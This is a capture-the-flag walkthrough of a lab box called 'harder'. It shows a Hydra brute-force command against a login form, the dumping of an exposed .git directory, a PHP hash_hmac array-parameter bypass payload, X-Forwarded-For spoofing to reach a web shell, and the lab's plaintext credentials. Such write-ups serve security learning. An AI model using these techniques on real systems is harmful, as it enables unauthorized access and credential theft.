# harder

## Enumeration

Start with an `nmap` scan per usual to see which ports are open, and what services run on the respective ports. `sudo nmap -Pn -v -A 10.10.222.15`

![nmap](images/nmap.png)

The website at port `80` seems empty, so we use `gobuster` to find hidden directories. This also seems to fail, because all requests are redirected to a standard error site.

By using Burp Suite we observe a _domain_ tag in the response from the website.

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 20 Sep 2020 18:13:29 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.19
Set-Cookie: TestCookie=just+a+test+cookie; expires=Sun, 20-Sep-2020 19:13:29 GMT; Max-Age=3600; path=/; domain=pwd.harder.local;secure
```

This response sets a cookie that is associated with the domain `pwd.harder.local`. When sending a request through burp to _pwd.harder.local_ we see that the site now has a lot more content.

![new request](images/alterRequest.png)

We thus need to associate the IP to the webserver with _pwd.harder.local_. `sudo nano /etc/hosts` and adding `<IP_to_server> pwd.harder.local` under the IPv4 section. This means that going to the website `pwd.harder.local` will take you to the associated IP.

Going to `pwd.harder.local` prompts us with a login. 

![login](images/login.png)

Using Hydra we try to crack the password `hydra pwd.harder.local -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/index.php:action=set_login&user=^USER^&pass=^PASS^:Invalid"`, and end up getting `[80][http-post-form] host: pwd.harder.local   login: admin   password: admin`.

username: admin

password: admin

After some trying and failing, I run gobuster on http://pwd.harder.local/ to try and find a hidden directory. Lucky for us there seems to be a hidden `/.git/` directory!

![gobuster](images/gobuster.png)

By going to `/.git/HEAD` we're prompted with a download for the HEAD file.

![git](images/git.png)

Using [GitDumper.py](https://github.com/arthaud/git-dumper/blob/master/git-dumper.py) I recursively try to download the contents of the hidden .git directory.

![gitdumper](images/git-dumper.png)

GitDumper found three php files in the .git directory. Taking a look at the first one, `auth.php` we see on the first line that the admin username and password is defined in plain text.
![admin](images/auth.png)

The `hmac.php` file, on the other hand, contains some very interesting code
```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```

This code throws a 40x error unless you somohow manage you know the secret generated `hm` value. You must send in at least two values `h` and `host`, and a seemingly optional `n`. [Refer to this article for more information regarding why this code is vulnerable](https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up). The really boiled down version of why this is exploitable is becase `hash_hmac('sha256', $_GET['n'], $secret)`, where `n` is an empty array and not a string, will return `false`. We can therefore always know the salt, `$secret=false`, which is used while generating `$hm = hash_hmac('sha256', $_GET['host'], $secret);`. This means that we can generate the hash locally and send it in together with the pre-image of the hash to get access.

By running 
```php
<?php
$secret = hash_hmac('sha256', "LookMomImHacking", false);
echo $secret;
?>
```
We get the hash `aca57efd1094b6befc7c79c010899e97364bd971523cd24236e26beed850bbfb`. 

From there it was easy to construct the payload `http://pwd.harder.local/index.php?h=aca57efd1094b6befc7c79c010899e97364bd971523cd24236e26beed850bbfb&n[]=&host=LookMomImHacking`, which gave us a link to a new "shell" and a pair of credentials. 

![harder.png](images/harder.png)

```
Username: evs
Password: 9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm
```

Heading to `shell.harder.local` gives us an _unknown host_ error. It must be added to `/etc/hosts` before we can proceed. It works, and we're greeted with a login page. After entering the credentials above we are met with yet another roadblock.

![](images/ip.png)

By changing the `X-Forwarded-For` header to something valid (for example 10.10.10.10) we are able to fool the server into thinking our request originated from that IP.
In Burp Suite's proxy you can use _match and replace_ to automatically add the header to all requests.

![](images/xForwarded.png)

Finally! We get access to some sort of shell we're able to interact with.

![](images/cmd.png)

By poking around a little we find `evs` home directory, and the user's `user.txt` file.

![](images/user.png)